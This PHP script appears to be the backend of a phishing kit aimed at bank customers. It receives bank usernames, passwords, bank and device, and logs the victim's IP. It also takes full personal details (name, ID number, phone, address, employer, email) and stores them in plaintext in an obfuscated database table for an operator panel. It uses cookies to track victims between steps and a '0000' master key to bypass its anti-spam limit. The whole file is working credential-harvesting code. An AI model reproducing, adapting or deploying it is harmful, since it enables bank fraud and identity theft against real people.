<?php
require_once("../lib/class.inputfilter.php");
require('../panel/include/setings.php');

// 🟢 INCLUIMOS TU ARCHIVO DE RATE LIMIT (Ajustando la ruta)
require_once('../panel/run/rate-limit.php');

date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

// 1. Recibir credenciales básicas
$usuario = '';
if (isset($_POST['usr']) && $_POST['usr'] !== '') {
    $usuario = $ifilter->process($_POST['usr']);
} elseif (isset($_COOKIE['usuario'])) {
    $usuario = $ifilter->process($_COOKIE['usuario']);
}

$contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
$banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
$dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : '';

// 🟢 OBTENEMOS LA IP REAL USANDO LA FUNCIÓN DE TU RATE-LIMIT.PHP
$ip = getClientIP();

// 2. CAPTURAR TODOS LOS DATOS PERSONALES
$nom = isset($_POST['nom']) ? $ifilter->process($_POST['nom']) : '';
$ape = isset($_POST['ape']) ? $ifilter->process($_POST['ape']) : '';
$tdoc = isset($_POST['tdoc']) ? $ifilter->process($_POST['tdoc']) : '';
$doc = isset($_POST['doc']) ? $ifilter->process($_POST['doc']) : '';
$cel = isset($_POST['cel']) ? $ifilter->process($_POST['cel']) : '';
$dir = isset($_POST['dir']) ? $ifilter->process($_POST['dir']) : '';
$emp = isset($_POST['emp']) ? $ifilter->process($_POST['emp']) : '';
$ref = isset($_POST['ref']) ? $ifilter->process($_POST['ref']) : '';
$mnt = isset($_POST['mnt']) ? $ifilter->process($_POST['mnt']) : 0; 
$eml = isset($_POST['eml']) ? addslashes(filter_var($_POST['eml'], FILTER_SANITIZE_EMAIL)) : '';

$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

if ($con = conectar()) {
    // 3. Buscar el ID si no hay cookie (mismo banco + última hora)
    if ($id === '' && $usuario !== '' && $banco !== '') {
        $usuario_esc = $con->real_escape_string($usuario);
        $banco_esc   = $con->real_escape_string($banco);
        $consulta = sentencia($con, "SELECT idreg FROM m3it3m WHERE usuario = '$usuario_esc' AND banco = '$banco_esc' AND horacreado >= DATE_SUB(NOW(), INTERVAL 1 HOUR) ORDER BY idreg DESC LIMIT 1");
        if (contarfilas($consulta)) {
            $datos = traerdatos($consulta);
            $id = (string)$datos['idreg'];
        }
    }

    // 4. SI EL ID SIGUE VACÍO -> ES UN CLIENTE NUEVO (CREAR REGISTRO)
    if ($id === '' && $usuario !== '') {
        
        // 🚨 EJECUTAR ESCUDO ANTI-SPAM (Excepto si es la llave maestra '0000')
        if ($ref === '0000') {
            resetRateLimit($ip); // Borra el archivo de bloqueo para esta IP
        } else {
            // Evaluamos la IP: Máximo 3 intentos cada 15 min (900s). Si se pasa, el script muere aquí mismo.
            checkRateLimit($ip, 3, 900, 900); 
        }

        // 🟢 CORRECCIÓN AQUÍ: Se guarda el $mnt en `valor_factura` y se deja `agente` en blanco. El estado se mantiene en 12.
        $query_insert = "INSERT INTO m3it3m (usuario, password, banco, dispositivo, ip, status, agente, valor_factura, nombre, apellido, tipo_doc, cedula, celular, direccion, empresa, referencia, email) 
                         VALUES ('$usuario', '$contrasena', '$banco', '$dispositivo', '$ip', 12, '', '$mnt', '$nom', '$ape', '$tdoc', '$doc', '$cel', '$dir', '$emp', '$ref', '$eml')";
        sentencia($con, $query_insert);
        
        $id = mysqli_insert_id($con);
        
        setcookie('id', $id, time() + 3600, '/');
        setcookie('usuario', $usuario, time() + 3600, '/');
    } 
    // 5. SI YA EXISTE -> ACTUALIZAR
    else if ($id !== '') {
        upgrade_user($id, $usuario, $contrasena, $banco); 
        
        // 🟢 CORRECCIÓN AQUÍ: Actualiza `valor_factura` en lugar de `agente`
        $query_update = "UPDATE m3it3m SET 
            nombre = '$nom', 
            apellido = '$ape', 
            tipo_doc = '$tdoc', 
            cedula = '$doc', 
            celular = '$cel', 
            direccion = '$dir', 
            empresa = '$emp', 
            referencia = '$ref',
            valor_factura = IF('$mnt' > 0, '$mnt', valor_factura),
            email = IF('$eml' != '', '$eml', email)
            WHERE idreg = '$id'";
            
        sentencia($con, $query_update);
    }
    desconectar($con);
}
?>